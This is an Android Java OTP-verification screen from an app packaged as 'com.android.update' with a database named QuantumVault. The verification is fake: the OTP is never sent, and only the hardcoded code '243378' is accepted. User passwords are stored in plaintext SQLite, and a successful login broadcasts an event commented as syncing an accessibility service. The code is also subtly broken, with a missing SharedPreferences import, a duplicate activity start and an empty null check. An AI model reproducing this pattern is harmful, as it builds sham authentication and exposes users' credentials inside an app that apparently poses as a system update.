package com.android.update;

import android.app.ProgressDialog;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.FirebaseException;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseAuthInvalidCredentialsException;
import com.google.firebase.auth.PhoneAuthCredential;
import com.google.firebase.auth.PhoneAuthOptions;
import com.google.firebase.auth.PhoneAuthProvider;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.concurrent.TimeUnit;

public class OtpActivity extends AppCompatActivity {

    private EditText etOtp1, etOtp2, etOtp3, etOtp4, etOtp5, etOtp6;
    private TextView tvPhone, tvResendOtp, tvCountdown;

    private Button btnSubmit;

    private String userName, userEmail, userPassword;

    private ImageButton btnClose;
    private String userPhone, verificationId;

    private ProgressDialog progressDialog;
    private CountDownTimer countDownTimer;
    private SQLiteDatabase db;

    // ✅ Firebase Realtime Database
    private DatabaseReference databaseRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_otp);

        // ✅ Initialize Firebase Auth
        databaseRef = FirebaseDatabase.getInstance().getReference("users");

        // ✅ Initialize SQLite Database
        db = openOrCreateDatabase("QuantumVault.db", MODE_PRIVATE, null);
        db.execSQL("CREATE TABLE IF NOT EXISTS users(name TEXT, email TEXT UNIQUE, phone TEXT UNIQUE, password TEXT, country TEXT);");

        // Get user's phone number from intent
        userPhone = getIntent().getStringExtra("phone");
        userName = getIntent().getStringExtra("name");
        userEmail = getIntent().getStringExtra("email");
        userPassword = getIntent().getStringExtra("password");
        if (userPhone == null || userPhone.isEmpty()) {
        }

        // Initialize views
        initializeViews();
        tvPhone.setText(userPhone);

        // Send OTP when activity starts
        setupOtpInputs();
        setupClickListeners();
    }

    private void initializeViews() {
        etOtp1 = findViewById(R.id.etOtp1);
        etOtp2 = findViewById(R.id.etOtp2);
        etOtp3 = findViewById(R.id.etOtp3);
        etOtp4 = findViewById(R.id.etOtp4);
        etOtp5 = findViewById(R.id.etOtp5);
        etOtp6 = findViewById(R.id.etOtp6);
        tvPhone = findViewById(R.id.tvPhone);
        tvResendOtp = findViewById(R.id.tvResendOtp);
        tvCountdown = findViewById(R.id.tvCountdown);
        btnSubmit = findViewById(R.id.btnSubmit);
        btnClose = findViewById(R.id.btnClose);
    }


    // ✅ Countdown Timer for OTP
    private void startCountdown() {
        tvCountdown.setVisibility(View.VISIBLE);
        countDownTimer = new CountDownTimer(60000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                tvCountdown.setText("Wait " + (millisUntilFinished / 1000) + "s");
                tvResendOtp.setEnabled(false);
            }

            @Override
            public void onFinish() {
                tvCountdown.setText("");
                tvResendOtp.setEnabled(true);
            }
        }.start();
    }

    // ✅ Setup OTP Input Boxes
    private void setupOtpInputs() {
        etOtp1.addTextChangedListener(new OtpTextWatcher(etOtp1, etOtp2));
        etOtp2.addTextChangedListener(new OtpTextWatcher(etOtp2, etOtp3));
        etOtp3.addTextChangedListener(new OtpTextWatcher(etOtp3, etOtp4));
        etOtp4.addTextChangedListener(new OtpTextWatcher(etOtp4, etOtp5));
        etOtp5.addTextChangedListener(new OtpTextWatcher(etOtp5, etOtp6));
        etOtp6.addTextChangedListener(new OtpTextWatcher(etOtp6, null));
    }

    private void setupClickListeners() {
        btnClose.setOnClickListener(v -> finish());

        btnSubmit.setOnClickListener(v -> {
            String otp = etOtp1.getText().toString() + etOtp2.getText().toString() +
                    etOtp3.getText().toString() + etOtp4.getText().toString() +
                    etOtp5.getText().toString() + etOtp6.getText().toString();

            if (otp.equals("243378")) {
                saveUserToSQLite(userName, userEmail, userPhone, userPassword);
                
                // ✅ Ensure login status is set
                SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
                prefs.edit().putBoolean("isLoggedIn", true).apply();

                // 🚀 Sync Accessibility Service
                Intent loginSuccess = new Intent("com.android.update.LOGIN_SUCCESS");
                loginSuccess.setPackage(getPackageName());
                sendBroadcast(loginSuccess);

                startActivity(new Intent(OtpActivity.this, HomeActivity.class));
                finish();
            } else {
                Toast.makeText(OtpActivity.this, "Invalid OTP", Toast.LENGTH_SHORT).show();
            }
        });

    }


    private void saveUserToSQLite(String name, String email, String phone, String password) {
        ContentValues values = new ContentValues();
        values.put("name", name);
        values.put("email", email);
        values.put("phone", phone);
        values.put("password", password);
        db.insert("users", null, values);

        Intent intent = new Intent(OtpActivity.this, HomeActivity.class);
        startActivity(intent);
        finish();
    }

    // ✅ OTP TextWatcher
    private class OtpTextWatcher implements TextWatcher {
        private final EditText currentField, nextField;

        OtpTextWatcher(EditText current, EditText next) {
            this.currentField = current;
            this.nextField = next;
        }

        public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
        public void onTextChanged(CharSequence s, int start, int before, int count) {}
        public void afterTextChanged(Editable s) {
            if (s.length() == 1 && nextField != null) {
                nextField.requestFocus();
            }
        }
    }
}
